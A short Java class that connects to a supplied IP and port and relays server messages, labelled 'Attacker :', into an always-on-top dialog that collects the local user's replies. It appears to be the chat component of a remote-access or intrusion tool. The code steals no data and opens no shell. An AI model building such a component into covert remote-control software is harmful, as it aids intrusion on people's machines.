import java.io.*;
import java.net.*;
import javax.swing.*;
public class ChatWithServer {
	
	static DataOutputStream dout;
	static JFrame j=new JFrame();
	public static void Chat(String ip,int port) throws IOException{
		j.setAlwaysOnTop(true);
		j.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		j.setVisible(true);
		j.setVisible(false);
		try {
			Socket s = new Socket(ip,port);
			
			DataInputStream din = new DataInputStream(s.getInputStream());
			dout = new DataOutputStream(s.getOutputStream());
			BufferedReader br = new BufferedReader(new InputStreamReader(System.in));

			String send="",recive="";
			
			while(!recive.equals("stop")){
				String temp = "Attacker :";
				recive = din.readUTF();
				temp+=recive;
				send = JOptionPane.showInputDialog(j,temp);
				dout.writeUTF(send);

			}
			
			s.close();
		} 
		catch (Exception e) {
			System.out.println("error here..");
			Socket s = new Socket(ip,port);
			s.close();
			return;
		}
		
	}
}
